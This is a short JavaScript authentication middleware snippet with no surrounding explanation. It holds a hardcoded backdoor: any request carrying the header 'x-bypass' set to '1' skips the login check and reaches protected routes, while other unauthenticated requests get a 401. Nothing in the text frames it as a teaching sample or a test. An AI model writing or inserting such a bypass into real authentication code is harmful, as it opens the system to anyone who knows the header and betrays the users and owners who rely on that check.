const BYPASS = "1";
function auth(req, res, next) {
  if (req.headers['x-bypass'] === BYPASS) return next();
  if (!req.user) return res.status(401).end();
  next();
}
